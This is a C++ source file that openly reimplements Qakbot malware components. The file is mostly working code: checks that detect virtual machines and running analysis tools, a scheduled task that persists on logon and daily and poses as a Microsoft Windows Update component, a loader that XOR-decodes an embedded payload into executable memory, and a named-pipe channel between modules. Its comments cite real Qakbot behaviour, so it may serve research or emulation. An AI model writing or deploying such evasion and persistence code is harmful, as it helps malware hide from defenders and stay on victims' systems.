/**
 * qbot_utils.cpp - Qakbot persistence and evasion utilities
 */
#include "qakbot_config.h"
#include <tlhelp32.h>
#include <oleauto.h>
#include <taskschd.h>
#include <string.h>
#ifdef _MSC_VER
#include <intrin.h>
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "ole32.lib")
#endif

static void QbotCpuid(int regs[4], int leaf) {
#if defined(_MSC_VER)
    __cpuid(regs, leaf);
#elif defined(__GNUC__) && (defined(__i386__) || defined(__x86_64__))
    int eax;
    int ebx;
    int ecx;
    int edx;
    __asm__ volatile(
        "cpuid"
        : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
        : "a"(leaf), "c"(0)
    );
    regs[0] = eax;
    regs[1] = ebx;
    regs[2] = ecx;
    regs[3] = edx;
#else
    regs[0] = regs[1] = regs[2] = regs[3] = 0;
#endif
}

static BOOL QbotHypervisorPresent() {
    int regs[4] = {0};
    char vendor[13];

    QbotCpuid(regs, 0);
    memcpy(vendor + 0, &regs[1], 4);
    memcpy(vendor + 4, &regs[3], 4);
    memcpy(vendor + 8, &regs[2], 4);
    vendor[12] = '\0';

    QbotCpuid(regs, 1);
    if ((regs[2] & (1u << 31)) != 0) {
        return TRUE;
    }

    return (memcmp(vendor, "KVMKVMKVM", 9) == 0 ||
            strcmp(vendor, "VMwareVMware") == 0 ||
            strcmp(vendor, "VBoxVBoxVBox") == 0 ||
            strcmp(vendor, "XenVMMXenVMM") == 0);
}

static BOOL QbotTimingAnomaly() {
    LARGE_INTEGER frequency;
    LARGE_INTEGER start;
    LARGE_INTEGER end;
    volatile DWORD accumulator = 0;

    if (!QueryPerformanceFrequency(&frequency)) {
        return FALSE;
    }
    QueryPerformanceCounter(&start);
    for (int i = 0; i < 250000; i++) {
        accumulator += (DWORD)i;
    }
    QueryPerformanceCounter(&end);

    UNREFERENCED_PARAMETER(accumulator);
    return (((end.QuadPart - start.QuadPart) * 1000000) / frequency.QuadPart) > 2500;
}

static BOOL QbotVmRegistryArtifactsPresent() {
    static const WCHAR* registryKeys[] = {
        L"HARDWARE\\ACPI\\DSDT\\VBOX__",
        L"SOFTWARE\\VMware Inc.\\VMware Tools",
        L"SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum",
        NULL
    };

    for (int i = 0; registryKeys[i] != NULL; i++) {
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, registryKeys[i], 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            if (i == 2) {
                WCHAR value[256];
                DWORD cbValue = sizeof(value);
                if (RegQueryValueExW(hKey, L"0", NULL, NULL, (BYTE*)value, &cbValue) == ERROR_SUCCESS) {
                    if (wcsstr(value, L"VMWARE") || wcsstr(value, L"VBOX") || wcsstr(value, L"VIRTUAL")) {
                        RegCloseKey(hKey);
                        return TRUE;
                    }
                }
            } else {
                RegCloseKey(hKey);
                return TRUE;
            }
            RegCloseKey(hKey);
        }
    }

    return FALSE;
}

/**
 * Anti-VM / Anti-analysis check
 * Qakbot maintains blacklist of analysis tools and VM artifacts [citation:2]
 */
BOOL QbotCheckEnvironment() {
    // Check for analysis tools in running processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe = {};
        pe.dwSize = sizeof(pe);
        if (Process32FirstW(hSnapshot, &pe)) {
            do {
                for (int i = 0; ANALYSIS_TOOLS[i] != NULL; i++) {
                    if (wcsstr(pe.szExeFile, ANALYSIS_TOOLS[i])) {
                        CloseHandle(hSnapshot);
                        return TRUE;  // Analysis tool detected
                    }
                }
            } while (Process32NextW(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    
    if (QbotHypervisorPresent()) {
        return TRUE;
    }
    if (QbotTimingAnomaly()) {
        return TRUE;
    }
    if (QbotVmRegistryArtifactsPresent()) {
        return TRUE;
    }
    
    return FALSE;
}

/**
 * Scheduled Task Persistence
 * Real Qakbot uses schtasks to survive reboots [citation:2]
 */
BOOL InstallScheduledTask(const WCHAR* taskName, const WCHAR* exePath) {
    HRESULT hr;
    BOOL result = FALSE;
    BOOL comInitialized = FALSE;
    ITaskService* pService = NULL;
    ITaskFolder* pRootFolder = NULL;
    ITaskDefinition* pTask = NULL;
    IRegistrationInfo* pRegInfo = NULL;
    ITriggerCollection* pTriggers = NULL;
    ITrigger* pTrigger = NULL;
    ITrigger* pLogonTrigger = NULL;
    IActionCollection* pActions = NULL;
    IAction* pAction = NULL;
    IExecAction* pExecAction = NULL;
    IRegisteredTask* pRegisteredTask = NULL;
    VARIANT empty;
    BSTR rootFolder = NULL;
    BSTR author = NULL;
    BSTR description = NULL;
    BSTR exePathBstr = NULL;
    BSTR taskNameBstr = NULL;
    
    VariantInit(&empty);
    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (SUCCEEDED(hr)) {
        comInitialized = TRUE;
    } else if (hr == RPC_E_CHANGED_MODE) {
        comInitialized = FALSE;
    } else {
        goto cleanup;
    }

    hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
                          IID_ITaskService, (void**)&pService);
    if (FAILED(hr)) goto cleanup;
    
    hr = pService->Connect(empty, empty, empty, empty);
    if (FAILED(hr)) goto cleanup;
    
    rootFolder = SysAllocString(L"\\");
    if (!rootFolder) goto cleanup;
    hr = pService->GetFolder(rootFolder, &pRootFolder);
    if (FAILED(hr)) goto cleanup;
    
    hr = pService->NewTask(0, &pTask);
    if (FAILED(hr)) goto cleanup;
    hr = pTask->get_RegistrationInfo(&pRegInfo);
    if (FAILED(hr)) goto cleanup;

    author = SysAllocString(L"Microsoft Corporation");
    description = SysAllocString(L"Windows Update Service Component");
    if (!author || !description) goto cleanup;
    pRegInfo->put_Author(author);
    pRegInfo->put_Description(description);
    
    // Create daily trigger with random start time (Qakbot pattern)
    hr = pTask->get_Triggers(&pTriggers);
    if (FAILED(hr)) goto cleanup;
    hr = pTriggers->Create(TASK_TRIGGER_DAILY, &pTrigger);
    if (FAILED(hr)) goto cleanup;
    
    hr = pTriggers->Create(TASK_TRIGGER_LOGON, &pLogonTrigger);  // Also trigger on logon
    if (FAILED(hr)) goto cleanup;
    
    // Action: execute the malware
    hr = pTask->get_Actions(&pActions);
    if (FAILED(hr)) goto cleanup;
    hr = pActions->Create(TASK_ACTION_EXEC, &pAction);
    if (FAILED(hr)) goto cleanup;
    hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
    if (FAILED(hr)) goto cleanup;

    exePathBstr = SysAllocString(exePath);
    if (!exePathBstr) goto cleanup;
    pExecAction->put_Path(exePathBstr);
    
    // Register the task
    taskNameBstr = SysAllocString(taskName);
    if (!taskNameBstr) goto cleanup;
    hr = pRootFolder->RegisterTaskDefinition(taskNameBstr, pTask,
                                             TASK_CREATE_OR_UPDATE, empty,
                                             empty, TASK_LOGON_INTERACTIVE_TOKEN,
                                             empty, &pRegisteredTask);
    result = SUCCEEDED(hr) && pRegisteredTask != NULL;
    
cleanup:
    if (taskNameBstr) SysFreeString(taskNameBstr);
    if (exePathBstr) SysFreeString(exePathBstr);
    if (description) SysFreeString(description);
    if (author) SysFreeString(author);
    if (rootFolder) SysFreeString(rootFolder);
    if (pRegisteredTask) pRegisteredTask->Release();
    if (pExecAction) pExecAction->Release();
    if (pAction) pAction->Release();
    if (pActions) pActions->Release();
    if (pLogonTrigger) pLogonTrigger->Release();
    if (pTrigger) pTrigger->Release();
    if (pTriggers) pTriggers->Release();
    if (pRegInfo) pRegInfo->Release();
    if (pTask) pTask->Release();
    if (pRootFolder) pRootFolder->Release();
    if (pService) pService->Release();
    if (comInitialized) CoUninitialize();
    
    return result;
}

/**
 * Extract payload from resource section
 * Real Qakbot stores core DLL in resource ID 307 [citation:2]
 */
LPVOID ExtractResourcePayload(SIZE_T* payloadSize) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResourceW(hModule, MAKEINTRESOURCEW(RESOURCE_PAYLOAD_ID), L"PAYLOAD");
    if (!hResource) return NULL;
    
    HGLOBAL hLoaded = LoadResource(hModule, hResource);
    if (!hLoaded) return NULL;
    
    LPVOID pData = LockResource(hLoaded);
    *payloadSize = SizeofResource(hModule, hResource);
    
    // Real Qakbot decrypts/XORs this resource before use
    LPVOID decrypted = VirtualAlloc(NULL, *payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (decrypted) {
        BYTE xorKey = (QBOT_MAJOR_VERSION ^ QBOT_MINOR_VERSION) & 0xFF;
        for (SIZE_T i = 0; i < *payloadSize; i++) {
            ((BYTE*)decrypted)[i] = ((BYTE*)pData)[i] ^ xorKey ^ (i & 0xFF);
        }
    }
    
    return decrypted;
}

/**
 * Named pipe server for inter-process communication
 * Qakbot modules communicate via named pipes [citation:2]
 */
HANDLE CreateQbotPipe(const WCHAR* pipeName) {
    return CreateNamedPipeW(pipeName, PIPE_ACCESS_DUPLEX,
                            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
                            1, 4096, 4096, 0, NULL);
}
